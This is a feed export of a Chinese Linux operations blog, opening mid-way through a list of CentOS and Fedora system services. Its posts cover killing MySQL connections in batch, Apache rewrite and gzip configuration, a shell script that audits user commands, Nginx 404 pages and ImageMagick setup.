<p><strong>squid</strong><br>代理服务器squid守护进程。</p>
<p><strong>smartd</strong><br>SMART Disk Monitoring 服务用于监测并预测磁盘失败或磁盘问题（前提：磁盘必须支持 SMART）。大多数的桌面用户不需要该服务，但建议开启它，特别是服务器。</p>
<p><strong>smb</strong><br>SAMBA 服务是在 Linux 和 Windows 之间共享文件必须的服务。如果有 Windows 用户需要访问 Linux 上的文件，就启用它。</p>
<p><strong>snmpd</strong><br>本地简单网络管理守护进程。</p>
<p><strong>sshd</strong><br>SSH 允许其他用户登录到你的系统并执行程序，该用户可以和你同一网络，也可以是远程用户。开启它存在潜在的安全隐患。如果你不需要从其它机器或不需要从远程登录，就应该关闭它。</p>
<p><strong>syslog**</strong><br><strong>**tcpmux-server</strong><br><strong>tftp</strong></p>
<p><strong>time**</strong><br>**该守护进程从远程主机获取时间和日期，采用TCP协议。</p>
<p><strong>time-udp</strong><br>该守护进程从远程主机获取时间和日期，采用UDP协议。<br><strong>time-dgram**</strong><br><strong>**time-stream</strong></p>
<p><strong>tux**</strong><br>**在Linux内核中运行apache服务器的守护进程。</p>
<p><strong>vsftpd</strong><br>vsftpd服务器的守护进程</p>
<p><strong>vmware-tools</strong><br>vmware-tools，虚拟机中装了vmware-tools包之后才会有的。</p>
<p><strong>vncserver</strong><br>VNC （Virtual Network Computing，虚拟网络计算），它提供了一种在本地系统上显示远程计算机整个”桌面”的轻量型协议。</p>
<p><strong>winbind</strong><br>Winbind 是一款 Samba 组件，在 CentOS 系统下，他被包含在了 samba-common 包中。 Winbind 在Linux上实现了微软的RPC调用、可插式验证模块和名字服务切换，通过 samba 接口与 Windows 域控获得联系，可以使NT域用户能在Linux主机上以Linux用户身份进行操作。通过设定 Linux 服务器的 nss 配置，我们可以让系统通过 Winbind 程序来解析用户信息。</p>
<p><strong>wpa_supplicant</strong><br>无线网卡上网服务</p>
<p><strong>xend, xendomains</strong><br>XEN虚拟服务相关</p>
<p><strong>xfs</strong><br>X Window字型服务器守护进程，为本地和远程X服务器提供字型集。</p>
<p><strong>xinetd</strong><br>（该服务默认可能不被安装）它是一个特殊的服务。它可以根据特定端口收到的请求启动多个服务。比如：典型的 telnet 程序连接到 23 号端口。如果有 telent 请求在 23 号端口被 xinetd 探测到，那 xinetd 将启动 telnetd 服务来响应该请求。为了使用方便，可以开启它。运行 chkconfig –list， 通过检查 xinetd 相关的输出可以知道有哪些服务被 xinetd 管理。</p>
<p><strong>ypbind</strong><br>为NIS（网络信息系统）客户机激活ypbind服务进程 。</p>
<p><strong>yppasswdd</strong><br>NIS口令服务器守护进程。</p>
<p><strong>ypserv</strong><br>NIS主服务器守护进程。</p>
<p><strong>yum, yum-updatesd</strong><br>RPM操作系统自动升级和软件包管理守护进程。</p>
<p><strong>ConsoleKit</strong><br>这个主要是 Gnome 使用的用于 Fedora - Fast User Switching ，主要用于自动加载 device 和 Power Management. 建议 Disable<br><strong>NetworkManager, NetworkManagerDispatcher</strong><br>主要用于笔记本的有线网络和无线网络之间的切换，有些 DHCP 用户会用到 . 建议 Disable<br><strong>acpid</strong><br>高级电源管理，在 Fedora 7 中默认安装的，如果需要可以安装<br><strong>anacron, atd, cron</strong><br>Linux 里面的计划任务，cron 建议打开，其它两项关闭<br><strong>auditd</strong><br>这个记录 kernel 的审计情况，相当于另外的一个 loggin 服务，用命令 auditctl 查看文件的变化情况，普通用户用不上可以关闭<br><strong>autofs</strong><br>自动加裁文件系统，如果你用的移动设备建议打开，不然就关掉咯<br><strong>avahi-daemon, avahi-dnsconfd</strong><br>相当于 mDNS 的一个软件，我也不知道干什么用的，建议关闭<br><strong>bluetooth, hcid, hidd, sdpd, dund, pand</strong><br>用于蓝牙设备的 deamon ，没有的可以关闭<br><strong>btseed, bttrack</strong><br>和 BitTorrent 相关的服务，建议关闭<br><strong>capi</strong><br>与ISDN相关的服务，一般用户都可以关闭<br><strong>cpuspeed</strong><br>控制CPU的频率用于节省电源， Pentium-M, Centrino, AMD PowerNow, Transmetta, Intel SpeedStep, Athlon-64, Athlon-X2, Intel Core<br>2 支持，如果你CPU不支持或者，想CPU全速运行都可以关掉它<br>cupsd, cups-config-daemon<br>以打印机相关的服务，有打印机可以打开<br><strong>dc_client, dc_server</strong><br>主要用以 SSL/TLS 服务，如 Apache Server，不使用就可以关闭<br><strong>dhcdbd</strong><br>DHCP相关服务，使用DHCP的人打开，用固定IP的关闭就行了<br><strong>firstboot</strong><br>用于第一启动相关的设置，关闭<br><strong>gpm</strong><br>对鼠标的支持，如果你用 console 要以打开，常用 x-server 就关闭<br><strong>haldaemon</strong><br>HAL (Hardware Abstraction Layer) 这个必须打开<br><strong>hplip, hpiod, hpssd</strong><br>HP打印机支持程序，不使就HP打印机的就关闭吧<br><strong>httpd</strong><br>Apache HTTP Web Server<br><strong>iptables</strong><br>Linux 下的防火墙，好东东啊<br><strong>ip6tables</strong><br>IPv6 的防火墙，大部分用户可以半闭了<br><strong>irda, irattach</strong><br>IrDA 支持服务，大部分用户都不会用上<br><strong>irqbalance</strong><br>对多核多CPU的用户的服务，用VMware的没必要打开了<br><strong>isdn</strong><br>ISDN用户用的，关闭<br><strong>kudzu</strong><br>如果你不是经常的更换硬件就关闭它<br><strong>lirc</strong><br>红外遥控支持，没什么用处<br><strong>lisa</strong><br>和网上邻居的功能很像，如果用Samba 或 NFS 可以打开<br><strong>lm_sensors</strong><br>主板测试PC健康用的服务，如CPU，硬盘温度之些的，不用可以关掉<br><strong>mcstrans</strong><br>用于查看 context 的，用 SELinux 的可打开<br><strong>mdmonitor</strong><br>用于监视软 RAID 和 LVM 信息，你也可以关掉<br><strong>messagebus</strong><br>IPC (Interprocess Communication) 进程间通信服务，一个重要的服务，必须打开<br><strong>nasd</strong><br>声音支持，用于X Windows，不用的就半掉<br><strong>netconsole</strong><br>初始化网络控制台登陆，关闭<br><strong>netfs</strong><br>用于自动加载NFS，Samba的服务，不用可以关掉<br><strong>netplugd</strong><br>监测网络接口用的，普通用户关掉<br><strong>nfs, nfslock</strong><br>用于 Unix/Linux/BSD 之间的文件共享，不用就半掉<br><strong>nmbd</strong><br>Samba的一个服务，用于NETBeui名称解析用的<br><strong>nscd</strong><br>用于缓存密码的，没什么用<br><strong>ntpd</strong><br>NTP服务<br><strong>pcscd</strong><br>用于对子 Smart Cards 的支持，不用就半掉<br><strong>readahead_early, readahead_later</strong><br>优化程序的启动速度用的，果如你想启动的快些就打开<br><strong>restorecond</strong><br>用于监控文件用的，如果你用 SELinux 就打开它<br><strong>rpcbind</strong><br>RPC服务支持 (像 NFS or NIS). 如果没有服务依赖它可以关掉<br><strong>rpcgssd, rpcidmapd, rpcsvcgssd</strong><br>用于 NFS v4. 除非你使用 NFS v4, 关掉<br><strong>sendmail</strong><br>Linux 下的邮件服务器<br><strong>setroubleshoot</strong><br>这个程序提供信息给 setroubleshoot Browser，如果你用 SELinux 可以打开它<br><strong>smartd</strong><br>SMART，用于监测硬盘的，VMware用户关掉<br><strong>smb</strong><br>SAMBA 与Windows共享文件用<br><strong>smolt</strong><br>用于提供每月的一些统计表，不知什么用，关掉<br><strong>sshd</strong><br>用于SSH连接用的<br><strong>yum-updatesd</strong><br>用于在线自动升级的，建议打开</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[批量杀死MySQL连接的几种方法]]></title>
      <url>/2012/06/14/e6-89-b9-e9-87-8f-e6-9d-80-e6-ad-bbmysql-e8-bf-9e-e6-8e-a5-e7-9a-84-e5-87-a0-e7-a7-8d-e6-96-b9-e6-b3-95.html</url>
      <content type="html"><![CDATA[<p>　方法一</p>
<p>　　通过information_schema.processlist表中的连接信息生成需要处理掉的MySQL连接的语句临时文件，然后执行临时文件中生成的指令。</p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr id="p23821"></tr></p>
<p><td id="p2382code1"></td></p>
<p><pre>mysql&gt; select concat(‘KILL ‘,id,’;’) from information_schema.processlist where user=’root’;<br>+————————+<br>| concat(‘KILL ‘,id,’;’) |<br>+————————+<br>| KILL 3101;             |<br>| KILL 2946;             |<br>+————————+<br>2 rows in set (0.00 sec)</pre></p>
<p>mysql&gt;select concat(‘KILL ‘,id,’;’) from information_schema.processlist where user=’root’ into outfile ‘/tmp/a.txt’;<br>Query OK, 2 rows affected (0.00 sec)</p>
<p>mysql&gt;source /tmp/a.txt;<br>Query OK, 0 rows affected (0.00 sec)<br><br><br><br><br> 　　方法二</p>
<p>　　杀掉当前所有的MySQL连接</p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr id="p23822"></tr></p>
<p><td id="p2382code2"></td></p>
<p><pre>mysqladmin -uroot -p processlist|awk -F “|” ‘{print $2}’|xargs -n 1 mysqladmin -uroot -p kill</pre><br><br><br><br><br> 杀掉指定用户运行的连接，这里为Mike</p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr id="p23823"></tr></p>
<p><td id="p2382code3"></td></p>
<p><pre>mysqladmin -uroot -p processlist|awk -F “|” ‘{if($3 == “Mike”)print $2}’|xargs -n 1 mysqladmin -uroot -p kill</pre><br><br><br><br><br>　方法三</p>
<p>　　通过SHEL脚本实现</p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr id="p23824"></tr></p>
<p><td id="p2382code4"></td></p>
<p><pre>#杀掉锁定的MySQL连接<br>for id in <code>mysqladmin processlist|grep -i locked|awk &#39;{print $1}&#39;</code><br>do<br>   mysqladmin kill ${id}<br>done</pre><br><br><br><br><br> 方法四</p>
<p>　　通过Maatkit工具集中提供的mk-kill命令进行</p>
<p><table></table></p>
<p><tbody></tbody></p>
<p><tr id="p23825"></tr></p>
<p><td id="p2382code5"></td></p>
<p><pre>#杀掉超过60秒的sql<br>mk-kill -busy-time 60 -kill</pre></p>
<p>#如果你想先不杀，先看看有哪些sql运行超过60秒<br>mk-kill -busy-time 60 -print</p>
<p>#如果你想杀掉，同时输出杀掉了哪些进程<br>mk-kill -busy-time 60 -print –kill<br><br><br><br><br>　mk-kill更多用法可参考：</p>
<p>　　<a href="http://www.maatkit.org/doc/mk-kill.html" target="_blank" rel="external">http://www.maatkit.org/doc/mk-kill.html</a><br>　　<a href="http://www.sbear.cn/archives/426" target="_blank" rel="external">http://www.sbear.cn/archives/426</a></p>
<p>　　Maatkit工具集的其它用法可参考：</p>
<p>　　<a href="http://code.google.com/p/maatkit/wiki/TableOfContents?tm=6" target="_blank" rel="external">http://code.google.com/p/maatkit/wiki/TableOfContents?tm=6</a></p>
<p>　　参考文档：</p>
<p>　　<a href="http://www.google.com" target="_blank" rel="external">http://www.google.com</a><br>　　<a href="http://www.orczhou.com/index.php/2010/10/kill-mysql-connectio-in-batch/" target="_blank" rel="external">http://www.orczhou.com/index.php/2010/10/kill-mysql-connectio-in-batch/</a><br>　　<a href="http://www.mysqlperformanceblog.com/2009/05/21/mass-killing-of-mysql-connections/" target="_blank" rel="external">http://www.mysqlperformanceblog.com/2009/05/21/mass-killing-of-mysql-connections/</a></p>
<p>&nbsp;</p>
]]></content>
      
        <categories>
            
            <category> MySQL数据库 </category>
            
        </categories>
        
        
    </entry>
    
    <entry>
      <title><![CDATA[解决访问网站目录必须增加斜杠的问题]]></title>
      <url>/2012/05/10/e8-a7-a3-e5-86-b3-e8-ae-bf-e9-97-ae-e7-bd-91-e7-ab-99-e7-9b-ae-e5-bd-95-e5-bf-85-e9-a1-bb-e5-a2-9e-e5-8a-a0-e6-96-9c-e6-9d-a0-e7-9a-84-e9-97-ae-e9-a2-98.html</url>
      <content type="html"><![CDATA[<p><strong>环境：</strong>LAMP环境</p>
<p><strong>方法：</strong>修改apache 的rewrite规则</p>
<p>vim .htaccess</p>
<p>增加一下规则：</p>
<p>RewriteBase /<br>RewriteCond %{REQUEST_FILENAME} !-f<br>RewriteCond %{REQUEST_URI} !(.<em>)/$<br>RewriteRule ^(.</em>)$ <a href="http://www.linuxhonker.com/" target="_blank" rel="external">http://www.linuxhonker.com/</a>$1/ [L,R=301]</p>
<p><strong>解析：</strong></p>
<p>*RewriteCond %{REQUEST_FILENAME} !-f&#160;&#160;&#160;&#160;&#160;&#160;&#160; </p>
<p>指定操作仅针对目录，对指向文件的url不进行rewrite操作；</p>
<ul>
<li>RewriteCond %{REQUEST_URI} !(.*)/$&#160;&#160;&#160;&#160;&#160;&#160;&#160;&#160; </li>
</ul>
<p>判断url是否以斜杠“/”结尾；</p>
<ul>
<li><p>RewriteRule ^(.*)$ <a href="http://www.linuxhonker.com/$1/" target="_blank" rel="external">http://www.linuxhonker.com/$1/</a> [L,R=301]&#160;&#160;&#160; </p>
<p>自动将符合上述条件的url以301跳转重定向至以斜杠结尾的版本，</p>
</li>
</ul>
<p>比如说将“<a href="http://www.linuxhonker.com" target="_blank" rel="external">http://www.linuxhonker.com/about</a>”重定向 至 “<a href="http://www.linuxhonker.com" target="_blank" rel="external">http://www.linuxhonker.com/about</a>”，其中“L”指该行为规则的最后一行，而“R=301”则指明采用301 Redirect。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> rewrite </tag>
            
            <tag> 伪静态 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[gzip的工作原理及在Nginx和Apache服务中的应用]]></title>
      <url>/2012/05/03/gzip-e7-9a-84-e5-b7-a5-e4-bd-9c-e5-8e-9f-e7-90-86-e5-8f-8a-e5-9c-a8nginx-e5-92-8capache-e6-9c-8d-e5-8a-a1-e4-b8-ad-e7-9a-84-e5-ba-94-e7-94-a8.html</url>
      <content type="html"><![CDATA[<p><strong>Gzip Web压缩工作原理</strong></p>
<p>Web服务器处理HTTP压缩的过程如下：</p>
<p>1. Web服务器接收到浏览器的HTTP请求后，检查浏览器是否支持HTTP压缩（Accept-Encoding 信息）；</p>
<p>2. 如果浏览器支持HTTP压缩，Web服务器检查请求文件的后缀名；</p>
<p>3. 如果请求文件是HTML、CSS等静态文件，Web服务器到压缩缓冲目录中检查是否已经存在请求文件的最新压缩文件；</p>
<p>4. 如果请求文件的压缩文件不存在，Web服务器向浏览器返回未压缩的请求文件，并在压缩缓冲目录中存放请求文件的压缩文件；</p>
<p>5. 如果请求文件的最新压缩文件已经存在，则直接返回请求文件的压缩文件；</p>
<p>6. 如果请求文件是动态文件，Web服务器动态压缩内容并返回浏览器，压缩内容不存放到压缩缓存目录中。</p>
<p><strong>下面是两个演示图：</strong></p>
<p>未使用Gzip：</p>
<p><img src="http://www.websbook.com/upimg/allimg/100428/1824140.png" alt="Apache Web Gzip"></p>
<p>开启使用Gzip后：</p>
<p><img src="http://www.websbook.com/upimg/allimg/100428/1824141.png" alt="Apache Web Gzip"></p>
<p>&nbsp;</p>
<pre><code> Gzip是一种流行的文件压缩算法，现在的应用十分广泛，尤其是在Linux平台。当应用Gzip压缩到一个纯文本文件时，效果是非常明显的，大约可以减少70％以上的文件大小。这取决于文件中的内容。

 利用Apache中的Gzip模块，我们可以使用Gzip压缩算法来对Apache服务器发布的网页内容进行压缩后再传输到客户端浏览器。这样经过压缩后实际上降低了网络传输的字节数，最明显的好处就是可以加快网页加载的速度。

 网页加载速度加快的好处不言而喻，除了节省流量，改善用户的浏览体验外，另一个潜在的好处是Gzip与搜索引擎的抓取工具有着更好的关系。例如Google就可以通过直接读取gzip文件来比普通手工抓取更快地检索网页。在Google网站管理员工具（Google Webmaster Tools）中你可以看到，sitemap.xml.gz 是直接作为Sitemap被提交的。

而这些好处并不仅仅限于静态内容，PHP动态页面和其他动态生成的内容均可以通过使用Apache压缩模块压缩，加上其他的性能调整机制和相应的服务器端缓存规则，这可以大大提高网站的性能。

因此，对于部署在Linux服务器上的PHP程序，在服务器支持的情况下，我们建议你开启使用Gzip Web压缩。
</code></pre><p>&nbsp;</p>
<p><strong>Nginx环境实现gzip优化web：</strong></p>
<p>&nbsp;</p>
<p><table width="671" border="0" cellspacing="0" cellpadding="2"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td valign="top" width="669">gzip on;<br>gzip_min_length  1k;<br>gzip_buffers     4 16k;<br>gzip_http_version 1.0;<br>gzip_comp_level 2;<br>gzip_types        text/plain application/x-javascript text/css application/xml;<br>gzip_vary on;</td><br><br><br><br>&nbsp;</p>
<p><strong>Apache环境实现gzip优化web：</strong></p>
<p><table width="669" border="0" cellspacing="0" cellpadding="2"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td valign="top" width="667">如果要开启gzip的话,一定要打开下面二个模块.<br>LoadModule headers_module modules/mod_headers.so<br>LoadModule deflate_module modules/mod_deflate.so</td></p>
<p>设置压缩比率，取值范围在 1(最低) 到 9(最高)之间,不建议设置太高，虽然有很高的压缩率，但是占用更多的CPU资源.<br>DeflateCompressionLevel 3<br>AddOutputFilter DEFLATE html xml php js css<br>&lt;Location /&gt;<br>SetOutputFilter DEFLATE<br>BrowserMatch ^Mozilla/4 gzip-only-text/html<br>BrowserMatch ^Mozilla/4.0[678] no-gzip<br>BrowserMatch bMSIE !no-gzip !gzip-only-text/html<br>SetEnvIfNoCase Request_URI .(?:gif|jpe?g|png)$ no-gzip dont-vary<br>SetEnvIfNoCase Request_URI .(?:exe|t?gz|zip|bz2|sit|rar)$ no-gzip dont-vary<br>SetEnvIfNoCase Request_URI .(?:pdf|mov|avi|mp3|mp4|rm)$ no-gzip dont-vary</p>
<p>Header append Vary User-Agent env=!dont-vary #对代理的设置<br>&lt;/Location&gt;<br><br><br><br>&nbsp;</p>
<p><strong>注意点：</strong></p>
<pre><code> Apache上利用Gzip压缩算法进行压缩的模块有两种：mod_gzip 和mod_deflate。要使用Gzip Web压缩，请首先确定你的服务器开启了对这两个组件之一的支持。在Linux服务器上，现在已经有越来越多的空间商开放了对它们的支持，有的甚至是同时支持这两个模块的。例如目前Godaddy、Bluehost及DreamHosts等空间商的服务器都已同时支持mod_gzip 和mod_deflate。

虽然使用Gzip同时也需要客户端浏览器的支持，不过不用担心，目前大部分浏览器都已经支持Gzip了，如IE、Mozilla Firefox、Opera、Chrome等。

通过查看HTTP头，我们可以快速判断使用的客户端浏览器是否支持接受gzip压缩。若发送的HTTP头中出现以下信息，则表明你的浏览器支持接受相应的gzip压缩：
</code></pre><p><strong>Accept-Encoding: gzip</strong> 支持mod_gzip<br><strong>Accept-Encoding: deflate</strong> 支持mod_deflate<br><strong>Accept-Encoding: gzip,deflate</strong> 同时支持mod_gzip 和mod_deflate</p>
<p>如果服务器开启了对Gzip组件的支持，那么我们就可以在http.conf或.htaccess里面进行定制，下面是一个.htaccess配置的简单实例：</p>
<p><table width="668" border="0" cellspacing="0" cellpadding="2"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td valign="top" width="666"><strong># mod_gzip：</strong><br>&lt;ifModule mod_gzip.c&gt;<br>mod_gzip_on Yes<br>mod_gzip_dechunk Yes<br>mod_gzip_item_include file .(html?|txt|css|js|php|pl)$<br>mod_gzip_item_include handler ^cgi-script$<br>mod_gzip_item_include mime ^text/.<em><br>mod_gzip_item_include mime ^application/x-javascript.</em><br>mod_gzip_item_exclude rspheader ^Content-Encoding:.<em>gzip.</em><br>&lt;/ifModule&gt;</td><br><br><br><br>&nbsp;</p>
<p><table width="667" border="0" cellspacing="0" cellpadding="2"></table></p>
<p><tbody></tbody></p>
<p><tr></tr></p>
<p><td valign="top" width="665"><strong># mod_deflate：</strong><br>&lt;ifmodule mod_deflate.c&gt;<br>DeflateCompressionLevel 6 #压缩率, 6是建议值.<br>AddOutputFilterByType DEFLATE text/plain<br>AddOutputFilterByType DEFLATE text/html<br>AddOutputFilterByType DEFLATE text/xml<br>AddOutputFilterByType DEFLATE text/css<br>AddOutputFilterByType DEFLATE text/javascript<br>AddOutputFilterByType DEFLATE application/xhtml+xml<br>AddOutputFilterByType DEFLATE application/xml<br>AddOutputFilterByType DEFLATE application/rss+xml<br>AddOutputFilterByType DEFLATE application/atom_xml<br>AddOutputFilterByType DEFLATE application/x-javascript<br>AddOutputFilterByType DEFLATE application/x-httpd-php<br>AddOutputFilterByType DEFLATE image/svg+xml<br>&lt;/ifmodule&gt;</td><br><br><br><br>     里面的文件MIME类型可以根据自己情况添加，至于PDF 、图片、音乐文档之类的这些本身都已经高度压缩格式，重复压缩的作用不大，反而可能会因为增加CPU的处理时间及浏览器的渲染问题而降低性能。所以就没必要再通过Gzip压缩。</p>
<pre><code>通过以上设置后再查看返回的HTTP头，出现以下信息则表明返回的数据已经过压缩。即网站程序所配置的Gzip压缩已生效。
</code></pre><p><strong>Content-Encoding: gzip</strong></p>
<p>注：不管使用mod_gzip 还是mod_deflate，此处返回的信息都一样。因为它们都是实现的gzip压缩方式。</p>
<p><strong><span style="color: #ff0000;">    检测是否支持gzip压缩：<a href="http://tool.chinaz.com/Gzips/" target="_blank" rel="external">http://tool.chinaz.com/Gzips/</a>    </span></strong></p>
<p>&nbsp;</p>
<p><strong>mod_gzip 和mod_deflate的主要区别是什么？使用哪个更好呢？</strong></p>
<ol>
<li><p>首先一个区别是安装它们的Apache Web服务器版本的差异。Apache 1.x系列没有内建网页压缩技术，所以才去用额外的第三方mod_gzip 模块来执行压缩。而Apache 2.x官方在开发的时候，就把网页压缩考虑进去，内建了mod_deflate 这个模块，用以取代mod_gzip。虽然两者都是使用的Gzip压缩算法，它们的运作原理是类似的。</p>
</li>
<li><p>第二个区别是压缩质量。mod_deflate 压缩速度略快而mod_gzip 的压缩比略高。一般默认情况下，mod_gzip 会比mod_deflate 多出4%~6％的压缩量。</p>
</li>
<li><p>对服务器资源的占用。一般来说mod_gzip 对服务器CPU的占用要高一些。mod_deflate 是专门为确保服务器的性能而使用的一个压缩模块，mod_deflate 需要较少的资源来压缩文件。这意味着在高流量的服务器，使用mod_deflate 可能会比mod_gzip 加载速度更快。</p>
</li>
</ol>
<p>不太明白？简而言之，如果你的网站，每天不到1000独立访客，想要加快网页的加载速度，就使用mod_gzip。虽然会额外耗费一些服务器资源，但也是值得的。如果你的网站每天超过1000独立访客，并且使用的是共享的虚拟主机，所分配系统资源有限的话，使用mod_deflate 将会是更好的选择。</p>
<p>另外，从Apache 2.0.45开始，mod_deflate 可使用DeflateCompressionLevel 指令来设置压缩级别。该指令的值可为1至（压缩速度最快，最低的压缩质量）9（最慢的压缩速度，压缩率最高）之间的整数，其默认值为6（压缩速度和压缩质量较为平衡的值）。这个简单的变化更是使得mod_deflate 可以轻松媲美mod_gzip 的压缩。</p>
<p>P.S. 对于没有启用以上两种Gzip模块的虚拟空间，还可以退而求其次使用php的zlib函数库（同样需要查看服务器是否支持）来压缩文件，只是这种方法使用起来比较麻烦，而且一般会比较耗费服务器资源，请根据情况慎重使用。</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> gzip压缩 </tag>
            
            <tag> web优化 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[linux 用户行为审计]]></title>
      <url>/2012/04/28/linux-e7-94-a8-e6-88-b7-e8-a1-8c-e4-b8-ba-e5-ae-a1-e8-ae-a1.html</url>
      <content type="html"><![CDATA[<p>根据公司需求，整理了一个linux用户审计的脚本，现和大家分享！<br>具体步骤如下： </p>
<p>一：配置调试 </p>
<p>1.创建用户审计文件存放目录和审计日志文件 ；<br>mkdir -p /var/log/usermonitor/ </p>
<p>2.创建用户审计日志文件；<br>echo usermonitor &gt;/var/log/usermonitor/usermonitor.log </p>
<p>3.将日志文件所有者赋予一个最低权限的用户；<br>chown nobody:nobody /var/log/usermonitor/usermonitor.log </p>
<p>4.给该日志文件赋予所有人的写权限；&#160;<br>chmod 002 /var/log/usermonitor/usermonitor.log </p>
<p>5.设置文件权限,使所有用户对该文件只有追加权限 ；<br>chattr +a /var/log/usermonitor.log </p>
<p>6.编辑/etc/profile文件，添加如下脚本命令； </p>
<p>export HISTORY_FILE=/var/log/usermonitor/usermonitor.log<br>export PROMPT_COMMAND=’{ date &quot;+%y-%m-%d %T ##### $(who am i |awk &quot;{print $1&quot; &quot;$2&quot; &quot;$5}&quot;)&#160; #### $(history 1 | { read x cmd; echo &quot;$cmd&quot;; })&quot;; } &gt;&gt;$HISTORY_FILE’ </p>
<p>7.使配置生效<br>source&#160; /etc/profile </p>
<p>二：功能测试 </p>
<p>首先使用如下命令监测用户行为审计日志文件； </p>
<p>tail -f /var/log/usermonitor/usermonitor.log </p>
<p>############################################################################<br>1.root用户登录，本地测试； </p>
<p>执行如下测试命令 </p>
<p>ll<br>more /etc/profile<br>vi /etc/profile<br>history </p>
<p>查看审计日志结果<br>12-03-20 00:00:13 ##### root pts/5 (192.168.0.101)&#160; #### ll<br>12-03-20 00:00:36 ##### root pts/5 (192.168.0.101)&#160; #### more /etc/profile<br>12-03-20 00:01:42 ##### root pts/5 (192.168.0.101)&#160; #### vi /etc/profile<br>12-03-20 00:01:47 ##### root pts/5 (192.168.0.101)&#160; #### history<br>12-03-20 00:01:59 ##### root pts/5 (192.168.0.101)&#160; #### history </p>
<p>############################################################################ </p>
<p>2.审计日志文件权限测试；<br>测试在普通用户下，审计日志文件的权限控制功能是否实现？ </p>
<p>测试普通用户读取审计日志文件，提示拒绝，表示普通用户无法读取审计日志文件；<br>[kjh@kjh ~]$ more /var/log/usermonitor/usermonitor.log<br>/var/log/usermonitor/usermonitor.log: Permission denied </p>
<p>测试普通用户对日志文件的写入权限，测试命令如下；<br>[kjh@kjh ~]$ echo 1 &gt;&gt;/var/log/usermonitor/usermonitor.log<br>[kjh@kjh ~]$ echo test &gt;&gt;/var/log/usermonitor/usermonitor.log<br>[kjh@kjh ~]$ echo test sm &gt;&gt;/var/log/usermonitor/usermonitor.log<br>[kjh@kjh ~]$ echo user test&#160; &gt;&gt;/var/log/usermonitor/usermonitor.log </p>
<p>查看日志监测结果； </p>
<p>12-03-20 00:05:18 ##### root pts/5 (192.168.0.101)&#160; #### useradd kjh<br>12-03-20 00:05:32 ##### root pts/5 (192.168.0.101)&#160; #### passwd kjh<br>1<br>test<br>test sm<br>user test<br>通过测试可以看出，用户审计日志文件权限控制功能生效（允许系统所有用户写入）； </p>
<p>########################################################################### </p>
<p>3.普通用户登录审计测试； </p>
<p>使用管理软件使用普通用户登录服务器系统，查看监测日志，能否监测到用户操作命令 </p>
<p>执行如下测试命令 </p>
<p>vi /etc/profile<br>ll<br>free -i<br>history </p>
<p>查看审计日志结果 </p>
<p>12-03-20 00:39:27 ##### kjh pts/2 (192.168.0.101)&#160; #### vi /etc/profile<br>12-03-20 00:39:33 ##### kjh pts/2 (192.168.0.101)&#160; #### ll<br>12-03-20 00:39:49 ##### kjh pts/2 (192.168.0.101)&#160; #### free -i<br>12-03-20 00:39:55 ##### kjh pts/2 (192.168.0.101)&#160; #### history </p>
<p>通过查看监测日志文件可以发现，普通用户登录后，所做的相关操作可以正常监控。 </p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
            <category> 系统安全 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> linux审计 </tag>
            
            <tag> 行为审计 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[Nginx配置404页面]]></title>
      <url>/2012/04/28/nginx-e9-85-8d-e7-bd-ae404-e9-a1-b5-e9-9d-a2.html</url>
      <content type="html"><![CDATA[<p>&#160;&#160; 404页面的目的是：告诉浏览者其所请求的页面不存在或链接错误，同时引导用户使用网站其他页面而不是关闭窗口离开。</p>
<p><strong>&#160;&#160; 404对seo的影响</strong></p>
<p> 自定义404错误页面是增强用户体验的很好的做法，但在应用过程中往往并未注意到对搜索引擎的影响，譬如：错误的服务器端配置导致返回“404”状态码或自定义404错误页面使用Meta Refresh导致返回“302”状态码。正确设置的自定义404错误页面，不仅应当能够正确地显示，同时，应该返回“404”错误代码，而不是 “200”或“302”。虽然对访问的用户而言，<a href="http://baike.baidu.com/view/1790469.htm" target="_blank" rel="external">HTTP状态码</a>究竟是“404”还是“200”来说并没有什么区别，但对搜索引擎这则是相当重要的。 </p>
<p><a href="http://baike.baidu.com/view/2755932.htm" target="_blank" rel="external">搜索引擎蜘蛛</a>在请求某个URL时得到“404”状态回应时，即知道该URL已经失效，便不再索引该网页，并向数据中心反馈将该URL表示的网页从索引数据库中删除，当然，删除过程有可能需要很长时间；而当搜索引擎得到“200”状态码时，则会认为该url是有效的，便会去索引，并会将其收录到索引数据库，这样的结果便是这两个不同的url具有完全相同的内容：自定义404错误页面的内容，这会导致出现复制网页问题。轻则被<a href="http://baike.baidu.com/view/2159580.htm" target="_blank" rel="external">搜索引擎降权</a>，重则会K掉网站。</p>
<p>&#160;</p>
<p>&#160;</p>
<p>在http全局定义里面加上：</p>
<font color="#804000"><strong>fastcgi_intercept_errors on; </strong></font>

<font color="#804000"></font>

<p>虚拟主机里面配置：</p>
<font color="#ff0000"><strong>error_page&#160; 404 = /404.html; </strong></font>

<p>然后再网站根目录编辑一个404.html</p>
]]></content>
      
        <categories>
            
            <category> Linux运维 </category>
            
        </categories>
        
        
        <tags>
            
            <tag> 404页面 </tag>
            
            <tag> Nginx 404 </tag>
            
        </tags>
        
    </entry>
    
    <entry>
      <title><![CDATA[imagemagick, imagick和magickwand编译安装]]></title>
      <url>/2012/04/27/imagemagick-imagick-e5-92-8cmagickwand-e7-bc-96-e8-af-91-e5-ae-89-e8-a3-85.html</url>
      <content type="html"><![CDATA[<p>注意不要忘记，将ImageMagick安装后的函数库所在目录加入到/etc/profile文件中的LD_LIBRARY_PATH环境变量 中，以及/etc/ld.so.conf中同时运行ldconfig，否则一些对ImageMagic的应用可能会出问题。</p>
